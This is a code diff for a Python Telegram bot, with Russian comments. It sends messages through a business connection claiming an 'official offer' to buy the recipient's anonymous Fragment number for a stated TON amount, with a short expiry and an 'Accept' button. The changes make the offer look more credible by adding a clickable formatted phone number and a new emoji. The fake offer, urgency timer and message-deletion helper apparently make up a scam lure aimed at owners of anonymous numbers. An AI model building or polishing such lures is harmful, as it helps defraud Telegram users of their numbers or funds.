@@ -19,8 +19,7 @@ CUSTOM_EMOJI_ID = "6023826881160157558"
 FRAGMENT_ICON_ID = "6014820764237171679"
 WALLET_ICON_ID = "5987635334945444280"
 
-# Твой ID + синий ромб (как было раньше)
-CUSTOM_EMOJI = f'<tg-emoji emoji-id="{CUSTOM_EMOJI_ID}">💎</tg-emoji>'
+CUSTOM_EMOJI = f'<tg-emoji emoji-id="{CUSTOM_EMOJI_ID}">🎁</tg-emoji>'
 
 async def safe_delete(chat_id, message_id, conn_id=None):
     if conn_id:
@@ -59,7 +58,11 @@ async def send_offer(message: Message):
         return
     
     phone_clean = phone_match.group(1)
-    
+    if len(phone_clean) >= 10:
+        formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:7]} {phone_clean[7:]}"
+    else:
+        formatted_phone = f"+{phone_clean}"
+
     text_without_phone = text_clean.replace(phone_match.group(0), "")
     amount_match = re.search(r"(\d+)", text_without_phone)
     
@@ -71,8 +74,9 @@ async def send_offer(message: Message):
     amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
+    # НОМЕР В ТЕКСТЕ (кликабельный)
     offer_text = (
-        f"{CUSTOM_EMOJI} Вам поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
+        f"{CUSTOM_EMOJI} Поступило официальное предложение о выкупе вашего анонимного номера <a href='{fragment_link}'><b>{formatted_phone}</b></a>.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
         f"Срок действия: <b>5ч 59м</b>\n\n"
         f"<i>Для рассмотрения предложения и запуска процедуры передачи, нажмите «Принять».</i>"
@@ -103,7 +107,6 @@ async def send_offer(message: Message):
         except:
             pass
 
-# --- ОСТАЛЬНОЙ КОД ---
 @dispatcher.callback_query(F.data == "accept_offer")
 async def on_accept_offer(callback: CallbackQuery):
     conn_id = callback.message.business_connection_id
